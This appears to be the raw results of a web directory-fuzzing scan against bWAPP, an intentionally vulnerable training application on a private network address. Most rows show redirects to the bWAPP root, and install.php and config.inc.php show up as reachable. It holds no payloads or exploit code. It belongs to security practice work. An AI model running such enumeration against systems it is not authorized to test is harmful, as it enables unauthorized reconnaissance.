171,200,75L,140W,http://192.168.1.86/bWAPP/install.php
163,200,0L,0W,http://192.168.1.86/bWAPP/config.inc.php
18,302,0L,0W,http://192.168.1.86/bWAPP/
20,302,0L,0W,http://192.168.1.86/bWAPP/
2,302,0L,0W,http://192.168.1.86/bWAPP/
4,302,0L,0W,http://192.168.1.86/bWAPP/
6,302,0L,0W,http://192.168.1.86/bWAPP/
8,302,0L,0W,http://192.168.1.86/bWAPP/
10,302,0L,0W,http://192.168.1.86/bWAPP/
22,302,0L,0W,http://192.168.1.86/bWAPP/
12,302,0L,0W,http://192.168.1.86/bWAPP/
14,302,0L,0W,http://192.168.1.86/bWAPP/
16,302,0L,0W,http://192.168.1.86/bWAPP/
24,302,0L,0W,http://192.168.1.86/bWAPP/
26,302,0L,0W,http://192.168.1.86/bWAPP/
28,302,0L,0W,http://192.168.1.86/bWAPP/
32,302,0L,0W,http://192.168.1.86/bWAPP/
30,302,0L,0W,http://192.168.1.86/bWAPP/
34,302,0L,0W,http://192.168.1.86/bWAPP/
44,302,0L,0W,http://192.168.1.86/bWAPP/
42,302,0L,0W,http://192.168.1.86/bWAPP/
40,302,0L,0W,http://192.168.1.86/bWAPP/
74,302,0L,0W,http://192.168.1.86/bWAPP/
76,302,0L,0W,http://192.168.1.86/bWAPP/
86,302,0L,0W,http://192.168.1.86/bWAPP/
82,302,0L,0W,http://192.168.1.86/bWAPP/
90,302,0L,0W,http://192.168.1.86/bWAPP/
80,302,0L,0W,http://192.168.1.86/bWAPP/
104,302,0L,0W,http://192.168.1.86/bWAPP/
46,302,0L,0W,http://192.168.1.86/bWAPP/
36,302,0L,0W,http://192.168.1.86/bWAPP/
106,302,0L,0W,http://192.168.1.86/bWAPP/
108,302,0L,0W,http://192.168.1.86/bWAPP/
38,302,0L,0W,http://192.168.1.86/bWAPP/
60,302,0L,0W,http://192.168.1.86/bWAPP/
120,302,0L,0W,http://192.168.1.86/bWAPP/
118,302,0L,0W,http://192.168.1.86/bWAPP/
62,302,0L,0W,http://192.168.1.86/bWAPP/
122,302,0L,0W,http://192.168.1.86/bWAPP/
126,302,0L,0W,http://192.168.1.86/bWAPP/
124,302,0L,0W,http://192.168.1.86/bWAPP/
128,302,0L,0W,http://192.168.1.86/bWAPP/
64,302,0L,0W,http://192.168.1.86/bWAPP/
130,302,0L,0W,http://192.168.1.86/bWAPP/
66,302,0L,0W,http://192.168.1.86/bWAPP/
138,302,0L,0W,http://192.168.1.86/bWAPP/
136,302,0L,0W,http://192.168.1.86/bWAPP/
